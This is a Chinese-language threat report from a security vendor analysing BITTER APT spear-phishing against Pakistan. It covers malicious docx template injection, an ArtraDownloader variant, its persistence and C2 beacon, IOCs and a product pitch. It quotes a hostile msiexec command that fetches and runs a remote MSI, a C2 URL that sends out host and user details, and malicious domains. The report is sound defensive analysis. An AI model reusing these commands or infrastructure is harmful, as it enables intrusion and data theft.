【高级持续性威胁追踪】BITTER组织近期攻击巴基斯坦活动分析
原创 深信服安全团队 深信服千里目安全实验室 昨天

收录于话题
2个

#高级持续性威胁追踪

| 组织背景

BITTER组织是一个长期针对亚洲国家进行攻击活动的APT组织，并且其还曾被发现对沙特阿
拉伯进行攻击，由于初期该组织的特码数据包头部以“BITTER”作为标识，因此命名为
“BITTER”，在国内其还有其他的名称如蔓灵花、APT-C-08、T-APT-17、苦象等名称。该
组织主要针对政府、军工、电力和核工业等行业进行攻击，从2019年开始，该组织对我国相
关进出口行业加强了攻击，窃取敏感资料。
 

| 样本分析

深信服安全团队近期捕捉到BITTER组织针对巴基斯坦地区的相关样本，本次捕捉到的样本为
该组织惯用的下载样本，通过鱼叉攻击发送恶意的模板注入docx文件，docx下载恶意漏洞模
板并执行。例如“Guidelines for Extension of official-Gratis Passports.docx”(免
费提供的官方护照延期指南.docx)

漏洞模板文件为公式编辑器漏洞文件



 
下载的rgn文件编译于2020.06.06 15:34:12，保存于c:\rgn\rgn.exe，该文件为该组织曾使
用过的下载器变种木马

 
本次攻击活动中发现的另一例msi恶意文件，该样本同样利用docx模板注入技术下载公式漏
洞模板文件，将
“msiexec /i http://www.bheragreens.com/img/winsupdater.msi” 执 行 命 令 写 入
runonece注册表，完成病毒下载执行



该恶意msi文件打包了恶意文件wnupdte.exe

 
提取其中的wnupdte.exe病毒文件，其编译时间为2020年1月6日19:10:40，通过分析可以
确认该病毒为ArtraDownloader v1变种。



 
其存在一个对话框资源，名称为“About ESET-Dwn”

 
对该病毒进行分析，其首先会从字符串资源中获取窗体的窗口名称(ESET-Dwn)和窗口类名
(ESETDWN)



 
通过获取的名称，创建一个窗体

 
接着该病毒会对加密的字符串进行解密，解密方式有两种，一种是直接加5，另一种是加上循
环变量加1，其中C2解密为mia.alkhaleejpk.info



 
接着其会检测进程“winupdt”（检测自身是否存在）和“avpui”(kaspersky相关文件)进
程是否存在，“winupdt”进程不存在，拷贝自身到sendto目录。

 
如果“avpui”进程存在，其会通过设置注册表启动项用于驻留(“%tempf%”环境变量指向
自身复制的文件）

注 册
注册表键 表 值 值

名称

HKCU\Enviorment tem C:\Users\%username%\AppData\Roamin
pf g\Microsoft\Windows\SendTo\winupdta.

exe



 

HKCU\SOFTWARE\Microsoft
tem

\Windows\CurrentVersion\R cmd /c start %tempf% && exit
p

un

 

 
如果“avpui”进程不存在，会在开始菜单目录下放置winup.lnk快捷方式文件驻留（lnk文
件指向自身复制的文件winupdt.exe）。



 
接下来其会获取主机的基本信息，主机名、用户名、操作系统名称

 
按照以下格式进行拼接，采用$进行分割
http://mia.alkhaleejpk.info/PsehestyvuPw/F1l3estPhPInf1.php?info=Test$WIN-
P01LA5VOT7J$admin$Windows7Ultimate-$-$WIN-P01LA5VOT7Jadmin
 



get请求信息 描述

xxxx.php 请求的php路径，被加密在文件中

变量1 Info=Test，硬编码在文件中

变量2 机器名(通常和主机名一样)

变量3 用户名

变量4 操作系统名+“-”

变量5 空置

变量6 机器名+用户名

 
该病毒发起的相关get请求流量，将获取的基本信息上传到C2

 
创建信号量“error”

接下来会检测返回数据，是否存在下载执行任务，如果存在下载执行任务，下载文件写入并
通过ShellExecuteA执行下载的文件



 

| 溯源分析
通过对C2的分析，可以看到在2020年01月时，已经有相关攻击活动出现了，本次攻击活动主
要集中在2020年6月到2020年10月左右。

 
同域名下存在另一个C2，mi.alkhaleejpk.info, 这两个域名都解析到82.221.136.4



 
继续分析C2，发现该地址疑似为该组织的后台管理地址，通过设置windows背景图来隐藏登
录界面，符合该组织近期的后台变化情况

 
该页面登录源码如下



 
分析该病毒文件，其被托管在bheragreens.com/img/winsupdater.msi

 
该网站为巴基斯坦私人住房协会相关的公司网站，其主要负责一些建筑建设、基础设施建设
等，被入侵用于托管恶意文件



 
liveways.pk为巴基斯坦相关的托管服务和IT基础架构解决方案提供商，官网被入侵用于托管
恶意软件

 
另 外 通 过 该 下 载 器 请 求 特 征 以 及 相 关 文 件 特 征 ， 我 们 可 以 确 认 该 下 载 器 为
ArtradDownloader v1的变种，该变种的特征一直在进行变化,通过分析，还发现请求为
info=ssss，使用‘@’进行分割的变种文件



 
从攻击样本提交区域和托管恶意文件网站处于巴基斯坦分析，可以确定本次攻击活动为
BITTER组织在2020年6月到2020年10月对巴基斯坦的相关攻击活动。
 

| IOC
C2:
mi.alkhaleejpk.info
mia.alkhaleejpk.info
www.bheragreens.com/img/winsupdater.msi
http://liveways.pk/images/rgnd
http://liveways.pk/images/rgn
box.livevideosonlinepk.com
82.221.136.4
 
Hash:
f5b87d9800aeb64d92dafd758f1d642b (Guidelines for Extension of official-Gratis
Passports.docx)
65be1e3712805bb0356f7e85c861f924 (rgnd)
808849de500179ec0fbc82c862f62333 (rgn、wnupdte.exe)



d30d19062bc6668e856946c63b6e9218 (winsupdater.msi）
df0cd6ac04f08a3c46546bc238dbacb1 (rt.msi)
761570587a2f92eea1512ff159ccef29 (rt.msi)
d3204365e948370998afdf6e903c7948 (e739.msi)
17e06d7e7789c6feaf41eb6be7885d62 (wnupdte.exe）
de6457c8bbb8e46154eec6b34d8d758a (wnupdte.exe）
72af5d72af656a593a6607554b7d25dd (wnupdte.exe）
5f63cc9905e26cfc18c14720ea02c158 (wnupdte.exe)

| Ref:
https://www.anquanke.com/post/id/214641
https://mp.weixin.qq.com/s/IcLGzGJYFx3dPUed0Bgv5w
https://mp.weixin.qq.com/s/TbiXJ359ZXOyQYWsfVDwGA
https://app.any.run/tasks/0751882a-3a21-48e7-bfeb-09c48deb649f/#
https://twitter.com/Timele9527/status/1280315854094123008
https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-
used-by-bitter-to-target-pakistan/

| 深信服安全产品解决方案
1. 深信服下一代防火墙AF、终端检测响应平台EDR、安全感知平台SIP等安全产品，已集成

了SAVE人工智能引擎，均能有效检测防御此恶意软件，已经部署相关产品的用户可以进行
安全扫描，检测清除此恶意软件，如图所示：



2. 深信服为广大用户免费提供查杀工具，可下载如下工具，进行检测查杀：
64位系统下载链接
http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z
32位系统下载链接
http://edr.sangfor.com.cn/tool/SfabAntiBot_X86.7z
3. 深信服安全感知平台、下一代防火墙、EDR用户，建议及时升级最新版本，并接入安全云
脑，使用云查服务以及时检测防御新威胁；
4. 深信服安全产品继承深信服SAVE安全智能检测引擎，拥有对未知病毒的强大泛化检测能
力，能够提前精准防御未知病毒；
5. 深信服推出安全运营服务，通过以“人机共智”的服务模式提供安全设备策略检查、安全威
胁检查、相关漏洞检查等服务，确保第一时间检测风险以及更新策略，防范此类威胁。